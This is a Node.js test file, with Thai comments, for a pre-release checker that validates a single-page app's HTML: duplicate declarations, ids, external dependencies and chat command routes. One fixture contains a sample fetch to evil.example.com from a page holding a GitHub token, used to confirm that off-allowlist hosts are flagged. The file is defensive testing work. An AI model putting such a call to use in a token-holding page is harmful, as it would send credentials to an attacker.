// เทสของด่านเอง — ด่านที่ผิดแย่กว่าไม่มีด่าน เพราะมันให้ความมั่นใจปลอม
//
//   node --test checks.test.mjs

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import {
  check, inlineScripts, topLevelNames, duplicateNames, idsIn, idsUsed, hostsIn, ALLOWED_HOSTS,
  chatRoutesIn,
} from './checks.mjs';

const ROOT = fileURLToPath(new URL('.', import.meta.url));
const REAL = readFileSync(`${ROOT}index.html`, 'utf8');

// ทุก fixture ต้องเป็น "หน้าที่ถูกต้องอยู่แล้ว" ยกเว้นสิ่งที่เทสนั้นตั้งใจทำให้ผิด
// จึงต้องมี CHAT_ROUTES ครบติดมาด้วย ไม่งั้นทุกเทสจะแดงเพราะเรื่องที่ไม่ได้ทดสอบ
const ROUTES_OK = `<script>const CHAT_ROUTES = [`
  + ['ออกกำลังกาย', 'ปิดงาน', 'เพิ่มงาน', 'โอที', 'ยืนยันงาน', 'ทิ้งงาน', 'นัด', 'สั่ง', 'ถาม']
    .map((p) => `{ p: '${p}' },`).join('')
  + `];</script>`;

const page = (body) => `<!doctype html><html><head><meta charset="utf-8"></head><body>${body}${ROUTES_OK}</body></html>`;

// ---------- หน้าจริงต้องผ่าน ----------

test('index.html ที่ใช้อยู่ตอนนี้ผ่านด่าน', () => {
  const { errors } = check(REAL, { root: ROOT });
  assert.deepEqual(errors, [], errors.join('\n'));
});

// ---------- บั๊กที่เกิดขึ้นจริง 22 ส.ค. 2026 ----------

test('ประกาศชื่อซ้ำต้องแดง — นี่คือบั๊กที่ทำให้ทั้งหน้าใช้ไม่ได้', () => {
  const html = page('<script>const esc = (s) => s;\nfunction esc(s) { return s; }</script>');
  const { errors } = check(html, { root: ROOT });
  assert.ok(errors.length > 0, 'ต้องจับได้');
  assert.ok(errors.some((e) => e.includes('esc')), errors.join('\n'));
});

test('duplicateNames ชี้ทั้งบรรทัดที่ชนและบรรทัดแรก', () => {
  const [d] = duplicateNames('const esc = 1;\nlet x = 2;\nfunction esc() {}');
  assert.equal(d.name, 'esc');
  assert.equal(d.firstLine, 1);
  assert.equal(d.line, 3);
});

test('ชื่อเดียวกันคนละขอบเขตไม่นับว่าซ้ำ', () => {
  // ตัวแปรที่ย่อหน้าอยู่ข้างในฟังก์ชันไม่ใช่ระดับบนสุด ประกาศซ้ำได้ตามปกติ
  const code = 'function a() {\n  const t = 1;\n}\nfunction b() {\n  const t = 2;\n}';
  assert.deepEqual(duplicateNames(code), []);
});

// ---------- สคริปต์ต้องอ่านออก ----------

test('syntax ที่พังต้องแดง', () => {
  const { errors } = check(page('<script>const $ = = 1;</script>'), { root: ROOT });
  assert.ok(errors.some((e) => e.includes('parse ไม่ผ่าน')));
});

test('type="module" แดง เพราะเปิดจากดิสก์ไม่ได้', () => {
  const { errors } = check(page('<script type="module">const a = 1;</script>'), { root: ROOT });
  assert.ok(errors.some((e) => e.includes('module')));
});

test('inlineScripts ข้ามตัวที่มี src', () => {
  const s = inlineScripts('<script src="x.js"></script><script>const a = 1;</script>');
  assert.equal(s.length, 1);
  assert.match(s[0].code, /const a/);
});

// ---------- ของนอก ----------

test('เพิ่ม CDN แล้วแดง', () => {
  const { errors } = check(page('<script src="https://cdn.jsdelivr.net/npm/x"></script>'), { root: ROOT });
  assert.ok(errors.some((e) => e.includes('dependency ภายนอก')));
});

test('web font แดง — คอมที่ทำงานอาจบล็อก', () => {
  const html = page('<style>@import url(https://fonts.googleapis.com/css2?family=X);</style><script>const a = 1;</script>');
  const { errors } = check(html, { root: ROOT });
  assert.ok(errors.some((e) => e.includes('@import')));
  assert.ok(errors.some((e) => e.includes('fonts.googleapis.com')));
});

// ---------- โทเคนต้องไม่หลุดออกนอก GitHub ----------

test('ยิงไปโดเมนอื่นแดง เพราะหน้านี้ถือ PAT อยู่', () => {
  const html = page('<script>fetch("https://evil.example.com/x");\nconst s = sessionStorage;</script>');
  const { errors } = check(html, { root: ROOT });
  assert.ok(errors.some((e) => e.includes('evil.example.com') && e.includes('PAT')), errors.join('\n'));
});

test('GitHub ยังยิงได้', () => {
  assert.deepEqual(hostsIn('https://api.github.com/x https://github.com/y').sort(), ALLOWED_HOSTS.slice().sort());
  const html = page('<script>fetch("https://api.github.com/repos");\nconst s = sessionStorage;</script>');
  assert.deepEqual(check(html, { root: ROOT }).errors, []);
});

// ---------- id ----------

test('id ซ้ำแดง', () => {
  const html = page('<div id="a"></div><div id="a"></div><script>const x = 1;</script>');
  assert.ok(check(html, { root: ROOT }).errors.some((e) => e.includes('id ซ้ำ')));
});

test('เปลี่ยนชื่อ id แค่ครึ่งเดียวแดง', () => {
  // เคสที่พังเงียบที่สุด: เปลี่ยนใน markup แล้วลืมเปลี่ยนในโค้ด หน้าเปิดได้แต่ปุ่มตาย
  const html = page('<div id="askPanel"></div><script>const $ = (id) => document.getElementById(id);\n$("askBox");</script>');
  const { errors } = check(html, { root: ROOT });
  assert.ok(errors.some((e) => e.includes('askBox')), errors.join('\n'));
});

test('idsIn เจอ id ที่อยู่ใน template literal ด้วย', () => {
  // หน้านี้สร้าง markup ด้วย innerHTML เยอะ id ในนั้นก็ต้องนับ
  assert.deepEqual(idsIn('const t = `<div id="row-1"></div>`;'), ['row-1']);
});

test('idsUsed รับทั้ง $() และ getElementById', () => {
  assert.deepEqual(idsUsed('$("a"); document.getElementById("b");').sort(), ['a', 'b']);
});

// ---------- ไม่มี build step ----------

test('topLevelNames นับเฉพาะที่คอลัมน์ 0', () => {
  const names = topLevelNames('const a = 1;\n  const b = 2;\nfunction c() {}').map((d) => d.name);
  assert.deepEqual(names, ['a', 'c']);
});

test('เตือนถ้าไม่เจอ sessionStorage', () => {
  const { warnings } = check(page('<script>const a = 1;</script>'), { root: ROOT });
  assert.ok(warnings.some((w) => w.includes('sessionStorage')));
});

// ---------- กล่องแชทต้องรู้จักคำสั่งครบ ----------

test('chatRoutesIn ดึงคำขึ้นต้นออกมาได้ และไม่หยิบค่าของ say มาด้วย', () => {
  const html = `const CHAT_ROUTES = [
  { p: 'ปิดงาน', say: 'ปิดงานให้แล้ว' },
  { p: 'นัด', say: 'จดนัดให้แล้ว' },
];`;
  assert.deepEqual(chatRoutesIn(html), ['ปิดงาน', 'นัด']);
});

test('หา CHAT_ROUTES ไม่เจอ = ล้ม ไม่ใช่ผ่านเงียบ', () => {
  assert.equal(chatRoutesIn('ไม่มีอะไรเลย'), null);
  const bare = '<!doctype html><html><body><script>const a = 1;</script></body></html>';
  const { errors } = check(bare, { root: ROOT });
  assert.ok(errors.some((e) => e.includes('CHAT_ROUTES')));
});

test('ขาดคำสั่งที่เซิร์ฟเวอร์รับอยู่ ต้องแดง — บั๊ก "นัด" 30 ส.ค. 2026', () => {
  // ตัดคำเดียวออกจากรายการจริง แล้วต้องได้ error ที่ชี้คำนั้นตรง ๆ
  const real = readFileSync(new URL('./index.html', import.meta.url), 'utf8');
  assert.ok(chatRoutesIn(real).includes('นัด'), 'ไฟล์จริงต้องมี นัด อยู่แล้ว');

  const broken = real.replace(/^.*p: 'นัด'.*$/m, '');
  const { errors } = check(broken, { root: ROOT });
  assert.ok(errors.some((e) => e.includes('นัด')), 'ตัด นัด ออกแล้วด่านต้องจับได้');
});
